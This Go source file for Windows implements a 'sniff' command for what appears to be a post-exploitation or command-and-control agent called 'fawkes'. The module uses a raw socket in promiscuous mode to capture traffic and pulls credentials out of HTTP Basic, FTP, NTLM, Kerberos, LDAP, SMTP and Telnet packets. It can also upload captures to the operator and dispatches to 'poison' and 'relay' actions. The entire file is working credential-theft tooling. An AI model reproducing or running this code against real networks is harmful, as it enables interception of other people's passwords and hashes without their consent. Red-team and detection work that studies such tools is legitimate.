//go:build windows

package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"fawkes/pkg/structs"
)

type SniffCommand struct{}

func (c *SniffCommand) Name() string { return "sniff" }
func (c *SniffCommand) Description() string {
	return "Passive network sniffing for credential capture (T1040)"
}

const (
	sioRCVALL  = 0x98000001
	rcvallOn   = 1
	rcvallOff  = 0
	ipprotoIP  = 0
	sockRaw    = 3
	afInet     = 2
	solSocket  = 0xFFFF
	soRCVTIMEO = 0x1006
)

func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := requireParams[sniffParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.Action == "poison" {
		return c.executePoison(task)
	}
	if params.Action == "relay" {
		return c.executeRelay(task)
	}

	if params.Duration <= 0 {
		params.Duration = 30
	}
	if params.Duration > 300 {
		params.Duration = 300
	}
	if params.MaxBytes <= 0 {
		params.MaxBytes = 50 * 1024 * 1024
	}

	var ports []uint16
	if params.Ports != "" {
		for _, p := range strings.Split(params.Ports, ",") {
			p = strings.TrimSpace(p)
			var port int
			if _, err := fmt.Sscanf(p, "%d", &port); err == nil && port > 0 && port < 65536 {
				ports = append(ports, uint16(port))
			}
		}
	}
	if len(ports) == 0 {
		ports = []uint16{21, 53, 80, 88, 110, 143, 389, 445, 8080}
	}

	// Find the local IP to bind to
	bindIP := sniffResolveBindIP(params.Interface)
	if bindIP == nil {
		return errorf("No suitable network interface found. Specify an interface name or IP address.")
	}

	// Create raw socket
	fd, err := syscall.Socket(afInet, sockRaw, ipprotoIP)
	if err != nil {
		return errorf("Failed to create raw socket (need Administrator): %v", err)
	}
	defer syscall.Closesocket(fd)

	// Bind to the local IP
	sa := &syscall.SockaddrInet4{Port: 0}
	copy(sa.Addr[:], bindIP.To4())
	if err := syscall.Bind(fd, sa); err != nil {
		return errorf("Bind to %s failed: %v", bindIP, err)
	}

	result := &sniffResult{}

	// Enable SIO_RCVALL to capture all IP traffic
	inBuf := uint32(rcvallOn)
	var bytesReturned uint32
	err = syscall.WSAIoctl(
		fd,
		sioRCVALL,
		(*byte)(unsafe.Pointer(&inBuf)),
		uint32(unsafe.Sizeof(inBuf)),
		nil,
		0,
		&bytesReturned,
		nil,
		0,
	)
	if err != nil {
		return errorf("SIO_RCVALL failed (need Administrator + Windows Firewall may interfere): %v", err)
	}
	defer func() {
		off := uint32(rcvallOff)
		syscall.WSAIoctl(fd, sioRCVALL, (*byte)(unsafe.Pointer(&off)),
			uint32(unsafe.Sizeof(off)), nil, 0, &bytesReturned, nil, 0)
	}()

	// Set receive timeout (1 second)
	timeout := int32(1000) // milliseconds
	syscall.SetsockoptInt(fd, solSocket, soRCVTIMEO, int(timeout))

	ftpTracker := &sniffFTPTracker{pending: make(map[string]string)}
	telnetTracker := &sniffTelnetTracker{pending: make(map[string]string)}
	var pcapCollector *sniffPCAPCollector
	if params.SavePCAP {
		pcapCollector = newSniffPCAPCollector(params.MaxBytes)
	}
	deadline := time.Now().Add(time.Duration(params.Duration) * time.Second)
	startTime := time.Now()
	buf := make([]byte, 65536)

	for !task.DidStop() && time.Now().Before(deadline) && result.BytesCaptured < params.MaxBytes {
		n, err := syscall.Read(fd, buf)
		if err != nil {
			if isTimeoutError(err) {
				continue
			}
			result.Errors = append(result.Errors, fmt.Sprintf("read: %v", err))
			break
		}
		if n == 0 {
			continue
		}

		result.PacketCount++
		result.BytesCaptured += int64(n)

		if pcapCollector != nil {
			pcapCollector.addPacket(buf[:n])
		}

		// Windows raw sockets deliver IP packets directly (no ethernet header)
		ipData := buf[:n]
		if len(ipData) < 20 {
			continue
		}

		ihl := int(ipData[0]&0x0F) * 4
		proto := ipData[9]
		if ihl < 20 || ihl > len(ipData) || (proto != 6 && proto != 17) {
			continue
		}
		totalLen := int(binary.BigEndian.Uint16(ipData[2:4]))
		if totalLen > len(ipData) {
			totalLen = len(ipData)
		}

		meta := packetMeta{
			SrcIP: net.IP(ipData[12:16]).String(),
			DstIP: net.IP(ipData[16:20]).String(),
		}
		transportData := ipData[ihl:totalLen]

		var payload []byte
		if proto == 6 { // TCP
			if len(transportData) < 20 {
				continue
			}
			meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
			meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
			dataOff := int(transportData[12]>>4) * 4
			if dataOff < 20 || dataOff > len(transportData) {
				continue
			}
			payload = transportData[dataOff:]
		} else { // UDP
			if len(transportData) < 8 {
				continue
			}
			meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
			meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
			payload = transportData[8:]
		}
		if len(payload) == 0 {
			continue
		}

		// Port filter
		portMatch := false
		for _, p := range ports {
			if meta.SrcPort == p || meta.DstPort == p {
				portMatch = true
				break
			}
		}
		if !portMatch {
			continue
		}

		if cred := sniffExtractHTTPBasicAuth(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if meta.DstPort == 21 || meta.SrcPort == 21 {
			if cred := ftpTracker.process(payload, &meta); cred != nil {
				result.Credentials = append(result.Credentials, cred)
			}
		}
		if cred := sniffExtractNTLM(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if cred := sniffExtractKerberos(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if cred := sniffExtractDNS(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if cred := sniffExtractLDAP(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if cred := sniffExtractSMTPAuth(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if cred := telnetTracker.process(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
	}

	result.Duration = time.Since(startTime).Truncate(time.Second).String()

	// Upload PCAP if requested (link type 101 = LINKTYPE_RAW for IP-only captures)
	if pcapCollector != nil && len(pcapCollector.packets) > 0 {
		pcapData := pcapCollector.buildPCAP(101)
		sniffUploadPCAP(&task, pcapData, result)
	}

	output, _ := json.Marshal(result)
	return successResult(string(output))
}

// sniffResolveBindIP finds the IP address to bind the raw socket to.
// Accepts an interface name (e.g. "Ethernet") or IP address string, or empty for auto-detect.
func sniffResolveBindIP(iface string) net.IP {
	// If given an IP address directly, use it
	if ip := net.ParseIP(iface); ip != nil {
		return ip.To4()
	}

	// If given an interface name, look up its IPv4 address
	if iface != "" {
		ifi, err := net.InterfaceByName(iface)
		if err == nil {
			addrs, _ := ifi.Addrs()
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
					return ipnet.IP.To4()
				}
			}
		}
		// Try partial match on interface name (Windows names can be long)
		ifaces, _ := net.Interfaces()
		ifaceLower := strings.ToLower(iface)
		for _, ifi := range ifaces {
			if strings.Contains(strings.ToLower(ifi.Name), ifaceLower) {
				addrs, _ := ifi.Addrs()
				for _, addr := range addrs {
					if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
						return ipnet.IP.To4()
					}
				}
			}
		}
		return nil
	}

	// Auto-detect: find the first non-loopback IPv4 interface
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil
	}
	for _, ifi := range ifaces {
		if ifi.Flags&net.FlagUp == 0 || ifi.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := ifi.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
				return ipnet.IP.To4()
			}
		}
	}
	return nil
}

func isTimeoutError(err error) bool {
	// WSAETIMEDOUT = 10060, WSAEWOULDBLOCK = 10035
	if errno, ok := err.(syscall.Errno); ok {
		return errno == 10060 || errno == 10035
	}
	return false
}
